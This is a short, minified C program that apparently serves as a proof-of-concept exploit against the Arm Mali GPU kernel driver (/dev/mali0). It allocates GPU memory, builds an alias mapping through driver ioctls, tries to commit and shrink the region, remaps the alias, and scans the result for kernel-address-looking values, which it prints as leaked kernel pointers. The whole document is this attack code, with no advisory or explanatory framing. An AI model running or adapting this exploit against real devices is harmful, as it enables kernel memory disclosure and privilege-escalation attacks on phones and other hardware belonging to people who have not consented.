#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/ioctl.h>
#include <sys/syscall.h>
#ifndef SYS_mmap2
#define SYS_mmap2 192
#endif
typedef uint64_t u64;typedef uint32_t u32;typedef uint16_t u16;
#define T 0x80
#define IOWR(n,s)(0xc0000000u|((s)<<16)|(T<<8)|(n))
#define IOW(n,s)(0x40000000u|((s)<<16)|(T<<8)|(n))
struct vc{u16 a,b;};struct sf{u32 f;};
union ma{struct{u64 v,c,e,f;}in;struct{u64 f,g;}out;};
struct ai{u64 h,o,l;};union al{struct{u64 f,s,n,a;}in;struct{u64 f,g,v;}out;};
struct cm{u64 g,p;};struct fr{u64 g;};
#define SAME (1ULL<<13)
#define P1 (1ULL<<0)
#define P2 (1ULL<<1)
#define G2 (1ULL<<2)
#define G3 (1ULL<<3)
#define ALLOC (64u*1024*1024)
int main(){int fd=open("/dev/mali0",2);struct vc v={999,999};if(fd<0||ioctl(fd,IOWR(0,4),&v)<0){perror("fd");return 1;}printf("ver %d.%d\n",v.a,v.b);struct sf s={0};ioctl(fd,IOW(1,4),&s);void*t=mmap(0,ALLOC,3,1,fd,3ULL<<12);if(t==MAP_FAILED){perror("tr");return 1;}union ma m;memset(&m,0,sizeof(m));m.in.v=ALLOC>>12;m.in.c=ALLOC>>12;m.in.f=SAME|P1|P2|G2|G3;if(ioctl(fd,IOWR(5,sizeof(m)),&m)<0){perror("al");return 1;}printf("gpuva=%llx\n",(unsigned long long)m.out.g);void*g=mmap(0,ALLOC,3,1,fd,(off_t)m.out.g);if(g==MAP_FAILED){perror("gm");return 1;}printf("g=%p\n",g);struct ai ai={.h=(u64)(uintptr_t)g,.o=0,.l=ALLOC>>12};union al a;memset(&a,0,sizeof(a));a.in.f=G2|G3|P1;a.in.s=ALLOC>>12;a.in.n=1;a.in.a=(u64)(uintptr_t)&ai;if(ioctl(fd,IOWR(21,sizeof(a)),&a)<0){perror("alias");return 1;}printf("alias=%llx\n",(unsigned long long)a.out.g);
 struct cm c={.g=m.out.g,.p=0};errno=0;int r=ioctl(fd,IOW(20,sizeof(c)),&c);printf("commit out r=%d errno=%d\n",r,errno);
 if(r<0){c.g=(u64)(uintptr_t)g;errno=0;r=ioctl(fd,IOW(20,sizeof(c)),&c);printf("commit user r=%d errno=%d\n",r,errno);} 
 void*av=(void*)syscall(SYS_mmap2,0,ALLOC,1,1,fd,(unsigned long)(a.out.g>>12));if(av==MAP_FAILED){perror("amap");return 1;}printf("alias=%p\n",av);u64*p=av;int found=0;for(size_t i=0;i<ALLOC/8;i++){if((p[i]&0xffffff8000000000ULL)==0xffffff8000000000ULL){printf("k[%zu]=%llx\n",i,(unsigned long long)p[i]);if(++found>10)break;}}printf("found=%d\n",found);return 0;}
